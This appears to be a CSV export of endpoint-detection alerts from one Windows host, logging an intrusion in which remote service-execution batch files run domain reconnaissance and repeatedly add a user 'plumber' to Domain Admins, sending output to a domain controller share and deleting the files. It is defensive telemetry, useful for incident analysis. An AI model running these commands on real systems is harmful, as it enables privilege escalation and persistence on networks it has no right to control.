"timestamp","Host","severity_name","severity","description","cmdline","files_written","entities"
"2025-03-28T10:51:39.89Z","10.0.1.11","High","70","A user created a new user account. Attackers can create new accounts to maintain their foothold on a system. Investigate the active user and newly created account.","net  group ""Domain Admins"" plumber /ADD /DOMAIN   ","",
"2025-03-28T10:51:32.406Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\uiVpaOtG.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\uiVpaOtG.bat & del C:\Windows\uiVpaOtG.bat","@{filename=uiVpaOtG.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159092}",
"2025-03-28T10:51:32.406Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\uiVpaOtG.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\uiVpaOtG.bat & del C:\Windows\uiVpaOtG.bat","@{filename=uiVpaOtG.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159092}",
"2025-03-28T10:51:09.784Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\QbPJfDfI.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\QbPJfDfI.bat & del C:\Windows\QbPJfDfI.bat","@{filename=QbPJfDfI.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159069}",
"2025-03-28T10:51:09.784Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\QbPJfDfI.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\QbPJfDfI.bat & del C:\Windows\QbPJfDfI.bat","@{filename=QbPJfDfI.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159069}",
"2025-03-28T10:51:06.85Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\dqxNzCfO.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\dqxNzCfO.bat & del C:\Windows\dqxNzCfO.bat","@{filename=dqxNzCfO.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159066}",
"2025-03-28T10:51:04.265Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\zoTJTlJg.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\zoTJTlJg.bat & del C:\Windows\zoTJTlJg.bat","@{filename=zoTJTlJg.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159064}",
"2025-03-28T10:51:04.265Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\zoTJTlJg.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\zoTJTlJg.bat & del C:\Windows\zoTJTlJg.bat","@{filename=zoTJTlJg.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159064}",
"2025-03-28T10:50:54.689Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user plumber ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\rSjRbeES.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\rSjRbeES.bat & del C:\Windows\rSjRbeES.bat","@{filename=rSjRbeES.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159054}",
"2025-03-28T10:50:49.436Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\XERmpkni.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\XERmpkni.bat & del C:\Windows\XERmpkni.bat","@{filename=XERmpkni.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159049}",
"2025-03-28T10:50:36.889Z","10.0.1.11","High","70","A process tree contains characteristics often associated with an adversary performing reconnaissance. This might be related to expected administrator activity. If this is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\CfdRYdpp.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\CfdRYdpp.bat & del C:\Windows\CfdRYdpp.bat","@{filename=CfdRYdpp.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159036}",
"2025-03-28T10:50:36.889Z","10.0.1.11","High","70","A process tree contains commands that some adversaries use for reconnaissance, but are also used by some system administrators. If this activity is unexpected, review the process tree.","C:\Windows\system32\cmd.exe /Q /c echo cd  ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\CfdRYdpp.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\CfdRYdpp.bat & del C:\Windows\CfdRYdpp.bat","@{filename=CfdRYdpp.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743159036}",
"2025-03-28T10:48:12.374Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Admins' plumber /add /domain ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\vtxXLKGD.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\vtxXLKGD.bat & del C:\Windows\vtxXLKGD.bat","@{filename=vtxXLKGD.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158892}",
"2025-03-28T10:47:58.903Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\AVyxgupJ.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\AVyxgupJ.bat & del C:\Windows\AVyxgupJ.bat","@{filename=AVyxgupJ.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158878}",
"2025-03-28T10:47:48.55Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user plumber ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\ZPOwZKbn.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\ZPOwZKbn.bat & del C:\Windows\ZPOwZKbn.bat","@{filename=ZPOwZKbn.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158868}",
"2025-03-28T10:47:46.059Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net user ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\qMagqoAR.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\qMagqoAR.bat & del C:\Windows\qMagqoAR.bat","@{filename=qMagqoAR.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158866}",
"2025-03-28T10:47:43.512Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Admins' plumetech.local/plumber /add /domain ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\sNlHlXOu.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\sNlHlXOu.bat & del C:\Windows\sNlHlXOu.bat","@{filename=sNlHlXOu.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158863}",
"2025-03-28T10:47:24.027Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group /domain ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\ZgDfDDYq.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\ZgDfDDYq.bat & del C:\Windows\ZgDfDDYq.bat","@{filename=ZgDfDDYq.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158844}",
"2025-03-28T10:47:12.261Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\YEiowPfg.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\YEiowPfg.bat & del C:\Windows\YEiowPfg.bat","@{filename=YEiowPfg.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158832}",
"2025-03-28T10:47:07.731Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Admins' /domain ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\NoDMVLEX.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\NoDMVLEX.bat & del C:\Windows\NoDMVLEX.bat","@{filename=NoDMVLEX.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158827}",
"2025-03-28T10:46:57.889Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group '*Domain Admins' plumber /add  /domain ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\eoYneBDd.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\eoYneBDd.bat & del C:\Windows\eoYneBDd.bat","@{filename=eoYneBDd.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158817}",
"2025-03-28T10:46:51.043Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Admins' plumber /add  /domain ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\AnjkaRuu.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\AnjkaRuu.bat & del C:\Windows\AnjkaRuu.bat","@{filename=AnjkaRuu.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158811}",
"2025-03-28T10:46:48.996Z","10.0.1.11","High","70","A service was started. Service execution can be used by attackers to execute code with elevated privileges. Investigate the process tree and service.","C:\Windows\system32\cmd.exe /Q /c echo net group 'Domain Admins' plumber /add ^> \\DC1\C$\__output 2^>^&1 > C:\Windows\rcnhrfJr.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\rcnhrfJr.bat & del C:\Windows\rcnhrfJr.bat","@{filename=rcnhrfJr.bat; filepath=\Device\HarddiskVolume1\Windows; timestamp=1743158808}",
